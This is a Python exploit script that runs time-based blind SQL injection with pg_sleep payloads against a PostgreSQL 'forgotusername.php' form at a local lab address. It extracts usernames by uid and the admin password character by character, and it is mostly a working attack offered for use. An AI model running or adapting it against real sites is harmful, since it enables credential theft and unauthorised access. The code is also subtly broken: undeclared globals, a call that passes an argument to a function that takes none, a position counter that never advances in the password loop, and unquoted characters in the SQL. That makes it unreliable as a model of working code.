import argparse
import requests
import sys
import string
from pwn import *

url = "http://172.17.0.2/forgotusername.php"
header = {"Content-Type": "application/x-www-form-urlencoded"}
numbers = string.digits
letters = string.ascii_lowercase
simbols = r"-_:@!$%&()*+/;<=>?[\]^{|}.~"
dictionary = numbers + letters + simbols

result = ""

def def_handler(sig, frame):
    print("\n[+] Exiting")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

def makeRequest(payload):
    data_post = {
        'username':'%s' % payload
    }
    r = requests.post(url = url, data = data_post, headers = header)
    return r

def usernameExtract(uid):
        p2 = log.progress("Initializing")
        p1 = log.progress("Output:")
        found = False
        i = 1
        while(True):
            for c in dictionary:
                payload = "test';SELECT CASE WHEN substring(username,%d,1)=%s then pg_sleep(3) else pg_sleep(0) end from users where uid = %s limit 1" % (i,c,uid)
                r = makeRequest(payload)
                result_time = r.elapsed.total_seconds()
                p2.status("Testing character %s in position %i" % (c, i))
                
                if result_time > 2:
                    result += c
                    p1.status(result)
                    found = True
                    i += 1
                    break

            if not found:
                break

def passwordExtract():
    p2 = log.progress("Initializing")
    p1 = log.progress("Output:")
    i = 1
    found = False
    while(True):
        for c in dictionary:
            payload = "test';SELECT CASE WHEN substring(password,%d,1)=%s then pg_sleep(3) else pg_sleep(0) end from users where username='admin' limit 1" % (i,c)
            r = makeRequest(payload)
            result_time = r.elapsed.total_seconds()
            p2.status("Testing character %s in position %i" % (c, i))
            
            if result_time > 2:
                result += c
                p1.status(result)
                found = True
                break

        if not found:
            break


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--uid', required=True, help='uid to extract password for')
    args = parser.parse_args()
    passwordExtract(args.uid)
    usernameExtract(args.uid)

if __name__ == "__main__":
    main()